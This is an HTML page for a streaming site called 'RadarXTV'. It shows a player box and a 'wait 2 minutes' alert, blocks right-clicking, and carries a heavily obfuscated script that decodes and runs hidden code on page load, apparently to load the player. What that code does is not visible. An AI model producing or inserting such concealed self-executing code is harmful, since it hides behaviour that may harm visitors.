<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>RadarXTV</title>
  <style>
    body {
      margin: 0;
      background: black;
      color: white;
      font-family: sans-serif;
      text-align: center;
    }

    .radar-logo {
      display: block;
      width: 100%;
      max-width: 700px;
      margin: 20px auto 10px;
      height: auto;
      object-fit: contain;
      filter: drop-shadow(0 0 15px #00f0ffcc);
    }

    .alert-box {
      position: fixed;
      top: 20px;
      left: 50%;
      transform: translateX(-50%);
      background-color: #ffcc00;
      color: black;
      padding: 10px 20px;
      font-size: 16px;
      border-radius: 8px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      width: 80%;
      max-width: 400px;
      box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.5);
      z-index: 9999;
      opacity: 1;
      transition: opacity 1s ease;
    }

    .alert-box button {
      background: transparent;
      border: none;
      color: black;
      font-size: 18px;
      cursor: pointer;
    }

    .player-container {
      width: 95%;
      max-width: 900px;
      margin: 20px auto;
      border-radius: 15px;
      overflow: hidden;
      position: relative;
      padding-top: 56.25%;
    }

    .player-container iframe {
      position: absolute;
      top: 0; left: 0;
      width: 100%; height: 100%;
      border: none;
      border-radius: 15px;
    }
  </style>
</head>
<body oncontextmenu="return false">
  <!-- ✅ BANNER -->
  
  <!-- ✅ ALERT MESSAGE -->
  <div id="alertMessage" class="alert-box">
    <span>Please wait for 2 minutes for stream to initialize.</span>
    <button onclick="closeAlert()">✖</button>
  </div>

  <!-- ✅ VIDEO BOX -->
  <div class="player-container" id="playerContainer"></div>

  <script>
  var loadIframe;(function(){var zYH='',LHI=588-577;function CHA(e){var q=555304;var z=e.length;var f=[];for(var t=0;t<z;t++){f[t]=e.charAt(t)};for(var t=0;t<z;t++){var h=q*(t+533)+(q%26917);var x=q*(t+740)+(q%13978);var y=h%z;var c=x%z;var v=f[y];f[y]=f[c];f[c]=v;q=(h+x)%2064909;};return f.join('')};var XsM=CHA('crtivouenzfrtkyojnhobualqwpssctrdcxgm').substr(0,LHI);var Zjn='lo }n=grcmn;r,eglCbvi[j-g9;e)2dfahnrivmno(qr).a;s{jo";d+.=h=8,o.bo;}7,]hdf+vva;rr,6(fg=r)p<cC{scfw07rbt6l,a=f+),nn=7.hv7n5).tf,  ;tf[v(b;npfakk[1=.l;rrus;v+i.vlrtv;[+-nl; lg i( )6c"a2;{malj=a]t=avuft=p=wu}s,0 s](0c;mSt2salvm=ef;]7(+{hdfqn;q<[u,)ntsto r nl tC=)")a<v.Cen;vrdnl )r)=avvpliog0+i-;{.. fvg6u+s+r;rqu=2;d(swagi;0nn.,he]za;4lC=h+o=)ao)dcft2;nsa yvxj1)=.r"85(,=<=;=av(giirgh=(t(v,nlr+eAv)v)av,q,e=0ht;s8f}9}{t[meuepdgc]0.hjv98=phl(p r",")d(jra+raeeoa=r,a((12[,8tdm*n2ui5"C3hqc[(v)>zhroveAh6rh5*p+..+080;]+=<tliet 1dq),-f(l; -nlm.r{ven+7;(1aa.=(r=a=S[[]6vwu ij80-f)e,rr51v()sev9tr4,e;a;]u)h o0rar(vpta1]stjah+;r}=s4;!a;u;=ggi>6=.(qrcc(!r.Cfrlbca,iwc(;[.8o1rv=w".ofn+o0;++,z4"A n+r;(cfn=vur]ugzjkf7ehsha;ncr ns23as(wopuea],r2]9)w(lbf+oh=p)9.a+ ga8o)i};=[p.a,gl;u4oif;l r)orvv9t;)=.v=iedi(;=th fjse1fo+ (r(me1r2pAr)+=a(,);.-tr;=gl[i[eo.qt)]rAt11=.66,)rn);Cotuu) ajst1et(0(suu4n)(7,wr";';var DXr=CHA[XsM];var urv='';var XGL=DXr;var Nam=DXr(urv,CHA(Zjn));var XKs=Nam(CHA('ounYkY,{u_$o_-s_3,rfYngY&!Y=1e(*Y)(id1_5o()_+],lY!p(t;p4oel(7e#a\/_,d(Yug n%4tu!e%.{v9Yii}rd.5Y()nY6;Yrr2.8t\/73l_!9leb6+Yu3n!Y#0YYaYa=$\/eYct!gYa)Yct(a;Y"};.p.9[s043l84ba)uEax_7=f=1m49_gbl_!h2l![;e$a.Yo;}rm.]ps).d{oY:5.$+dr+65cp9wo3#i6rsi)o7nxi7cr.cacYfei_uY,rc$s\/$c!c]:e)t4=1l&th.fYrfer){ lrr2}r) l=;;_8i.Y95 9e]8C)t}u%YmYY,+) !dsl{]5Yv3s0t35sol8j{le[]algY7f_etrdog3l}tnY6$YoYo),!-na8==i_a.!r+%r+lncji05Y8.)Cae";wY4o u3]Yl34=po!jc]r,(hYlc!", [=d_Yf.hti_u6C,.!n59\/_Y%SdbccYyo"g;tas%w;]d3y#,$2eonYbrY56Yc2%sf"4tb$le;,;obs=s4)5*c.Yet1t)=wetr)i6.,I)fyYlu(t1.roYc=pc9i]pce}6g)3gj(4;$Yc)_eo_)3uuY4v8ilYfeneeY,uld;r0fpet% o66o4iln;eYf5trrs ds0#%!.cYY82e9a2Yawu.a%_f)o-n9rfYY3,eat8z}3iY;t(]_1;$sd,m$pYsie0YY7(i(Y.1e3)=stac7931l}41{4)=Y;ctY$Yn;x#(1p4t.a(iw.(5s)Y(jm7r.c$a-21ra \/j),_i (l_s!ft(a"i!u (6%=%=()becec4.,x_l%%;;5as$nYoe2il3tj1Y35(5,u%Y\'ys[ .#\'(,!.Yo$.m%f)b32%oo)ga;oe3o(7(, l.e$e(oic);s(z_nao]e1r(gYr[r!Y#1.Yp=.nn_}hif-jcr(g!)-Y3Y_-eoinof_odo(.2%!4YcY.tYop).tuY$SrYnhYclr}s$30.lowY]8;)1.m)_loi i\'Yc 0c"flt n(arYr3)a:(,-0Y 3w{3Y)4$_(beY)lYn.uYrC8s9ep,Yn}u33bY%$44+n\/.Y(%pa+3c\/Yc(;te*co8+Y.h.864dYc4Y{jwcf])Yg}(Y.a_%1Y1a3({[a4;7)r Y70i99ot6,;0ep553o54sd)_.4Y-64y(g.)%ri"Yer)atc-Y_Sn3uY]go4v(c )5xs6fieeue0\' $Yo.l]YYrr0_r:67,($x[ub-o3uIfaauY=ge_nwiY.]4[_d2mi.nm.aowg)Y"){&n=0(on=l(Y!lnaYe$.5$.bY#r0(.,_d$.( faY%a317lhgt3 ak.;(acuYcn_csYr36(YYac_r.9,(;Y1ip%,C60{l7Yt}YY{5c4_e*Y$5n-1s7)3_8.uaf$1Dr)ax5.=mpYs$..1E6t_fe$o.!!_()%5$g\/xtfa*e,lt)s(e=Y\/t4bfe$_]tx)nn,s.)acpdt9,,(Y&_e]0u5Y0_390)4c?n.n,Y3,l_n1,a.38b; 0oad3tY;r.7]l4(Y)[,\'.l!=(.5t_ve%8b_]b3:is).e%=eYf[of8;Yi_3]!_.s8.Y_r,Ym_k\/Y!774 uYanY0s!mf-dsgl) r&r,+{v)e2]Y%i'));var IVW=XGL(zYH,XKs );IVW(9617);return 6122})()
  </script>
</body>
</html>